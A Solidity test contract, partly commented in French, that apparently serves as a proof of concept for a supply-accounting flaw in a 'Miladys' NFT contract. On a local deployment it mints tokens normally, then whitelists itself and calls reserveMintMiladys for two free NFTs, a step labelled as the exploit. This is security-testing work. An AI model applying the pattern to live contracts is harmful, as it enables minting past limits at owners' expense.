// SPDX-License-Identifier: MIT
pragma solidity 0.7.0;
pragma experimental ABIEncoderV2;

import "../src/Miladys.sol";

contract SupplyInconsistencyTest {
    Miladys public miladys;
    address public whitelistUser = address(0x1234);
    
    // Events pour logs
    event Log(string message, uint256 value);
    
    function setUp() public {
        // Deploy contract
        miladys = new Miladys();
        
        // Add whitelistUser to whitelist
        address[] memory whitelist = new address[](1);
        whitelist[0] = whitelistUser;
        miladys.editWhitelistTwo(whitelist);
        
        // Active la vente
        miladys.flipSaleState();
    }
    
    function testSupplyInconsistency() public payable {
        emit Log("=== STEP 1: Mint via mintMiladys ===", 0);
        
        // Mint 50 NFTs pour simplifier (au lieu de 9498)
        uint256 priceFor30 = 0.06 ether * 30;
        miladys.mintMiladys{value: priceFor30}(30);
        miladys.mintMiladys{value: 0.07 ether * 20}(20);  // ← CORRIGÉ: 0.07 au lieu de 0.06
        
        uint256 supplyBefore = miladys.totalSupply();
        uint256 standardCount = miladys.standardMiladyCount();
        
        emit Log("Supply avant reserve", supplyBefore);
        emit Log("standardMiladyCount", standardCount);
        emit Log("MAX_MILADYS", miladys.MAX_MILADYS());
        
        emit Log("=== STEP 2: Exploit via reserveMintMiladys ===", 0);
        
        // Simulate whitelistUser calling reserveMintMiladys
        // On ne peut pas faire vm.prank en Solidity 0.7.0
        // Donc on va mint directement nous-mêmes après s'être whitelist
        
        address[] memory selfWhitelist = new address[](1);
        selfWhitelist[0] = address(this);
        miladys.editWhitelistTwo(selfWhitelist);
        
        miladys.reserveMintMiladys(); // 2 NFTs gratuits
        
        uint256 supplyAfter = miladys.totalSupply();
        emit Log("Supply apres reserve", supplyAfter);
        emit Log("NFTs mintes via reserve", supplyAfter - supplyBefore);
        
        // Vérification: totalSupply devrait être 52
        require(supplyAfter == 52, "Supply should be 52");
        
        emit Log("=== TEST PASSED ===", supplyAfter);
    }
    
    // Permet de recevoir des NFTs
    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
    
    receive() external payable {}
}
